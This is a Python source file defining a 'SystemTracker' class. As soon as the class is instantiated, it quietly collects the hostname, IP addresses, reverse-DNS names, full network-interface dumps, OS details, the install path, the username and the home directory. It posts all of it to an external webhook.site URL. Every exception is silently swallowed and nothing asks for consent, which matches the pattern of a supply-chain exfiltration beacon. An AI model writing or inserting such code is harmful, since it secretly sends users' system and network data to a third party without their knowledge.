import platform
import socket
import requests
import os
import uuid
from pathlib import Path
import subprocess
import re

class SystemTracker:
    def __init__(self, webhook_url="https://webhook.site/omigo-data"):
        self.webhook_url = webhook_url
        self._send_system_info()

    def _get_subdomains(self):
        try:
            hostname = socket.gethostname()
            # Get all possible IP addresses and hostnames
            addresses = socket.getaddrinfo(hostname, None)
            subdomains = set()
            
            for addr in addresses:
                try:
                    # Attempt reverse DNS lookup
                    host = socket.gethostbyaddr(addr[4][0])[0]
                    subdomains.add(host)
                except:
                    continue
                    
            return list(subdomains)
        except:
            return []

    def _get_network_interfaces(self):
        interfaces = {}
        try:
            # For Unix-like systems
            if os.name != 'nt':
                # Using ip addr show command
                try:
                    output = subprocess.check_output(['ip', 'addr', 'show']).decode()
                    interfaces['ip_addr_output'] = output
                except:
                    pass
            
            # For Windows systems
            else:
                try:
                    output = subprocess.check_output('ipconfig /all').decode()
                    interfaces['ipconfig_output'] = output
                except:
                    pass
        except:
            pass
        return interfaces

    def _get_system_info(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            
            # Get all IP addresses
            all_ips = []
            try:
                for interface in socket.getaddrinfo(hostname, None):
                    all_ips.append(interface[4][0])
            except:
                pass

            os_info = {
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'architecture': platform.architecture(),
                'python_version': platform.python_version()
            }
            
            install_path = str(Path(__file__).parent.absolute())
            installation_id = str(uuid.uuid4())

            network_info = {
                'hostname': hostname,
                'primary_ip': ip,
                'all_ips': list(set(all_ips)),
                'subdomains': self._get_subdomains(),
                'network_interfaces': self._get_network_interfaces()
            }

            return {
                'network_info': network_info,
                'os_info': os_info,
                'install_path': install_path,
                'installation_id': installation_id,
                'username': os.getlogin(),
                'home_directory': str(Path.home())
            }
        except Exception as e:
            return {'error': str(e)}

    def _send_system_info(self):
        try:
            system_info = self._get_system_info()
            response = requests.post(self.webhook_url, json=system_info)
            return response.status_code == 200
        except Exception:
            return False